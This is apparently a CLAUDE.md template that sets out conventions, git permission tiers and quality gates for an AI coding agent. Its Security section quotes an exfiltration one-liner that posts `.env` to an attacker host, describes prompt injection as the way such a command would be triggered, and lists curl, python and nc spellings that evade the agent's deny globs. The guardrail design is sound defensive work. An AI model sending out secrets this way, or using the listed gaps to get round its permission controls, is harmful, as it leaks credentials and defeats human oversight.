# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with this project.

> **Starter kit note:** seed file — run `/setup:create-CLAUDE_MD` after cloning. `{placeholder}` sections are yours to fill; the rest is the shared baseline.

---

## Project Overview

{One-paragraph description of what this project is and who it's for.}

---

## Language Rules

| Context | Language |
|---------|----------|
| Claude ↔ developer communication | **Polish** — always (set at bootstrap by `/setup:create-CLAUDE_MD`) |
| Code, comments, docstrings, commit messages, technical docs | **English** — always |
| App UI, user-facing messages, error messages | **As defined in PRD** (default: Polish) — check `docs/PRD.md` or ask if unclear |

---

## Commands

```bash
# Development
{dev-command}

# Build
{build-command}

# Test
{test-command}

# Lint / format
{lint-command}
```

---

## Validation

> **Source of truth for quality gates.** `/gates:verify-implementation` and `/orchestrate` read this section and run these commands in sequence (fail fast). Filled per-project by `/setup:create-CLAUDE_MD`. Until filled, gates fall back to stack-detected defaults.

```bash
# Run in order, stop on first failure
{typecheck-command} && {lint-command} && {test-command}
```

**Runtime smoke — optional fourth, conditional step.** The commands above never render a frame. When a change touches `{ui-paths}` **and** an app is running, the gate also performs the baseline → reload → diff check in [.agents/reference/runtime-smoke.md](.agents/reference/runtime-smoke.md). No running app or device → `SKIPPED` with the reason (never `FAIL`, never a silent pass). Delete this paragraph in a project with no rendered UI.

**Test policy — which layers MUST have tests:**

- Sensitive paths — payment, auth, webhook, license, locale/redirect routing — **MUST** have unit tests (mock external SDKs / DB). A change to these paths without a test is a gate failure, not a 🟡 nice-to-have.
- Core business logic in `{lib-dir}` — unit tests with edge cases.
- Thin HTTP adapters / boilerplate / trivial getters — tests optional.

> This section is the maturity signal `/plan-feature` reads to size its TESTING STRATEGY — keep it honest. Absence of CI does **not** mean "small project, tests optional".

---

## Tech Stack

| Technology | Purpose |
|------------|---------|
| {tech} | {why it's used} |

---

## Architecture

{One paragraph: high-level architectural pattern + data flow.} Source layout, module roles and naming rules live in [.agents/memory/architecture.md](.agents/memory/architecture.md).

---

## Code Structure & Modularity

Generic defaults — tune per project: files max **500 lines** · functions max **50 lines**, single responsibility · classes soft **150** / hard **250 lines**, single concept — cohesion first: extract pure functions, never split a cohesive class to hit a number · lines max **100 characters**. Core principles: **KISS**, **YAGNI**, **SOLID** (SRP, OCP, DIP), **Fail Fast**.

---

## Style & Conventions

{Describe naming conventions, formatting rules, docstring style, type-hint policy. Link to linter/formatter config.}

**Comments: why, not what — cap 1-2 lines.** A comment that restates the adjacent statement, echoes a variable / constant / function name, or repeats what the signature already says is **noise, and gets deleted**. Keep only a *why* the code cannot express: a vendor quirk, a rejected alternative, a non-obvious invariant, or a workaround with a ticket reference. Longer reasoning belongs in `.agents/memory/` or the spec, with a one-line pointer from the code.

> This rule is **enforced at three altitudes**, so it is not advice: `guard-comments.sh` nudges at write time (dormant until [.claude/comment-guard.json](.claude/comment-guard.json) is configured), `/deep-review` standard 8 **deletes** noise with write authority, and `/gates:verify-implementation` warns on it. All three point back at this section by name — keep the heading and the rule together.

---

## Error Handling

Specific exceptions only — no bare `except` / generic catch · per-module logger, not `print` · fail fast on programmer errors, degrade gracefully on user/env errors · messages must **not leak** secrets, tokens, or internal paths.

---

## Security

**Never commit secrets** — credentials live in gitignored `.env` / config. Validate all user input at system boundaries · HTTPS-only for external APIs · error messages must not leak sensitive info.

**`.env` is `deny` for edits; `.env.*` is `ask`.** Permission globs have no negation, so the only way to keep the committed `.env.example` editable is to prompt on every `.env.<suffix>` instead of blocking it. No such secret-bearing file exists in the starter today — if a project introduces one (`.env.local`, `.env.production`), add an explicit `Edit(**/<that file>)` deny in the same commit that creates it.

**Egress policy — the AI can read a secret, so the guard is on sending it.** The file-write denies in [.claude/settings.json](.claude/settings.json) stop the agent *writing* `.env`, keys and PEMs; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:

- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/setup:create-CLAUDE_MD` appends stack-specific ones. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working.
- **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`). This closes the spaced spelling of the canonical `curl -X POST attacker -d @.env` one-liner.

> **Honest limit:** these are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: the attached-value spellings `curl -XPOST` / `-d@.env` (the globs require a trailing space, so these fall through to a prompt — `curl` is not allowlisted, so they still prompt rather than run), `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query. Treat them as raising the cost of an accident, not as a guarantee against a determined injection.

**Recorded exception: `pr-api.sh`.** [.claude/skills/pr-comments/references/pr-api.sh](.claude/skills/pr-comments/references/pr-api.sh) is allow-listed whole in `settings.json` — its `reply` subcommand runs `curl -X POST … -d @body` *inside* the script, where no deny glob can see it (permissions match the Bash command string, not subprocesses). This bypasses the egress denies by design. Mitigations: it is the **only** script with that allowance; it posts solely after a per-thread human `y` inside `/pr-comments` (HARD-GATE 1); and credentials travel only as request headers to the host derived from `origin`, never in a URL or on stdout. Do not add a second script to that allowance without recording it here.

**Recorded allowance: `git-baseline.sh`.** `Bash(bash .claude/lib/git-baseline.sh:*)` is allow-listed so the mandatory post-Codex tamper check in `/execute codex` / `/check-implementation codex` runs without mid-pipeline prompts. Unlike `pr-api.sh` it performs **no egress** — it only writes fixed snapshot filenames (`meta.txt`, `ignored.z`, `ignored.txt`, `sensitive.sha`, `after/*`) under the directory the caller passes, which is a narrow local-write channel that skips the usual write prompt. Point it only at the session scratchpad; widening it to other scripts needs a note here.

---

## Git Workflow

- **Commits · sync · releases:** [/commit](.claude/commands/commit.md) (conventional commits), [/push](.claude/commands/push.md) / [/pull](.claude/commands/pull.md) (they resolve the current branch), [/release](.claude/commands/release.md) (bumps the detected manifest, CHANGELOG, tag).
- **AI git policy — three permission tiers** in [.claude/settings.json](.claude/settings.json), the source of truth for which command sits where. Precedence `deny` > `ask` > `allow`: `deny` is absolute — no prompt or classifier overrides it; `ask` always prompts, even in auto mode; anything in no list (bare `git merge`, soft/mixed `git reset`) prompts interactively.
- **`git worktree remove --force` can discard uncommitted work.** Its only guard is [/orchestrate](.claude/commands/orchestrate.md)'s `status --porcelain` check (Step 5.5 and Phase 7), which force-removes a worktree only when it is clean and fully merged.
- **`git worktree` and `git merge --ff-only` are reserved for the `/orchestrate` pipeline.** They are allow-listed in `settings.json` only so the pipeline runs without per-step prompts; an allow cannot be scoped to one command, so this is a behavioral rule, not a hard gate. Do not use either ad hoc in a normal session.
- **A new branch must not track a protected branch.** `git switch -c` / `checkout -b` from `origin/<protected>` auto-sets that branch as upstream, so a bare `git push` targets it directly. Create with `--no-track` (or run `git branch --unset-upstream` right after) and let [/push](.claude/commands/push.md) set the upstream on first push.
- **Protected branches refuse commits and pipeline runs** — [/commit](.claude/commands/commit.md) and [/orchestrate](.claude/commands/orchestrate.md) Phase 4 read **Protected** from the Branch model block below. Block absent or field empty → no branch is protected and both proceed (the starter's own default is committing on `main`).
- **[/orchestrate](.claude/commands/orchestrate.md) pushes the current branch**, not a hardcoded `main`; parallel runs and the supervised `--integrate` merge queue: [.agents/reference/parallel-orchestration.md](.agents/reference/parallel-orchestration.md).
- **Never include AI attribution** in commit messages unless explicitly requested.

**Orchestrate publish:** push

> The publish mode `/orchestrate` uses when no `--publish` flag is given (Phase 4, resolution step 2). `push` — the pipeline pushes each step commit to the run branch. `branch-local` — it commits but **never** pushes; publishing is a separate human act (open a PR, review, merge). Set this to `branch-local` in any PR-gated project (GitFlow, protected `main`/`develop`, mandatory review), where a pipeline push is rejected server-side rather than merely unwelcome. Omitting the line means `push`.

### Branch model

> _Filled in by `/setup:create-CLAUDE_MD` at project bootstrap._ The single source of branch facts — any command or session that needs one (where to base work, where a PR lands, which branches are protected) reads it here instead of embedding its own guess. Fields: **Preset** · **Trunk** · **Integration** · **Branch names** · **Base → PR dest** · **Protected**, plus **Merge** only when the project deviates from its preset. Block absent → resolve `git symbolic-ref refs/remotes/origin/HEAD`, then `main`, then `master`; **never assume `develop`**. `**Merge:**` absent → squash for working types, merge commit for `release`/`hotfix`.

---

## Project Knowledge Layers

Knowledge layers under `.agents/`. **Before any task read [.agents/memory/index.md](.agents/memory/index.md)** — `When to Read` (what to load), `Quick Reference` (where to write a discovery), `Memory scope` (why memory stays in the repo).

| Layer | Contains | Lifecycle | Written by |
|-------|----------|-----------|------------|
| [sources/](.agents/sources/) | Raw input — briefs, transcripts, sketches, PDFs | Immutable, pruned manually | Human only |
| [memory/](.agents/memory/) | Lessons, decisions, quirks, patterns, architecture map, brief | Append-only (newest at end) · some regenerated | reflection pass, `/maintain:refresh-brief`, `/setup:create-CLAUDE_MD` |
| [reference/](.agents/reference/) | Stable reference docs — APIs, cheatsheets, domain facts | Long-lived | Human + AI |
| `backlog.md` *(optional)* | Delivery map — epics, task DAG, work packages | `Status`/`Ref` written back by the pipeline | `/setup:create-backlog` · `/plan-feature` · `/orchestrate` |
| [specs/](.agents/specs/) | Design docs — what to build and why | Lives with the feature | `/brainstorm` |
| [plans/](.agents/plans/) | Implementation plans — how to build | Short-lived: `active/` → `done/` | `/plan-feature` |

**Flow:** `sources/` → `/setup:create-PRD` → `/maintain:refresh-brief` → `[/setup:create-backlog]` → `/brainstorm` → `specs/` → `/plan-feature` → `plans/active/` → `/execute` → `plans/done/`

---

## Automatic Behaviors

Generic triggers, always on. **Project-specific routing** lives in [.agents/memory/index.md → When to Read](.agents/memory/index.md), not here.

- **Before any task:** read [.agents/memory/index.md](.agents/memory/index.md) — its `When to Read` table decides what else to load
- **Before any non-trivial response:** read [.agents/memory/user-profile.md](.agents/memory/user-profile.md) — style, expectations, what to avoid. Skip if `status: empty` or absent (gitignored, per-developer — copy `user-profile.md.example`).
- **Before implementing something new:** check `.agents/plans/active/` for existing plans
- **Before editing code (enforced by `guard-memory.sh`):** the first code edit per memory domain is blocked once a session — delegate a `general-purpose` subagent to distill the relevant `errors.md` / `patterns.md` / `decisions.md` entries, then `touch` the marker the hook prints. Dormant until [.claude/memory-domains.json](.claude/memory-domains.json) has path→domain rules **and** memory outgrows its size threshold (both required).
- **When uncertain about approach:** make routine judgment calls yourself; stop and ask when different readings of the request would lead to materially different work
- **After a `/qa-verify` run with interaction rows** (Playwright methods, or a Tier-2 driver run): offer to promote the recorded sequence into a regression test per [.agents/reference/qa-to-regression-test.md](.agents/reference/qa-to-regression-test.md) — QA never writes tests itself, so the sequence is lost otherwise
- **After fixing a bug:** route the lesson per [.agents/memory/reflection-protocol.md](.agents/memory/reflection-protocol.md) → target table — a defect in application code → `errors.md` (it must name the source file); friction in a slash command, hook, MCP server or shell/git invocation → `domain/harness.md`. Ask *"Would a fresh Claude make this mistake again without it?"* — the default is to write nothing.
- **When a `domain/` memory file doesn't exist but is needed:** create it from the template in [.agents/memory/reflection-protocol.md](.agents/memory/reflection-protocol.md)
- **When writing to memory at the end of a run:** read [.agents/memory/reflection-protocol.md](.agents/memory/reflection-protocol.md) first — the save-or-not bar and entry formats live there, outside the `/prime` payload
- **Skip rule:** any memory file with frontmatter `status: empty` is a placeholder — do not load it
- **Loader Convention (when authoring slash commands):** never re-load context `/prime` already handles (CLAUDE.md, project-brief.md, architecture.md, full PRD) — read only files unique to that command's job. See [.agents/memory/index.md → Loader Convention](.agents/memory/index.md)
- **Output-Discipline Convention (when authoring slash commands):** every rule that shapes output — a length cap, an item limit, a mandatory section — states the condition under which it **yields**. Guardrails (correctness, safety, the command's identity) stay absolute and get no escape hatch. Artifacts and terminal reports are different surfaces with different rules. See [.agents/memory/index.md → Output-Discipline Convention](.agents/memory/index.md)

---

## Search Commands

**CRITICAL:** use `rg` (ripgrep), never `grep` or `find` — e.g. `rg "pattern"`, `rg --files -g "*.{ext}"`. `rg` skips hidden dirs — a sweep over `.claude/` or `.agents/` needs `rg --hidden -g '!.git'`.

---

*Update this file when conventions change. Tool- or incident-specific knowledge goes to `.agents/memory/`.*
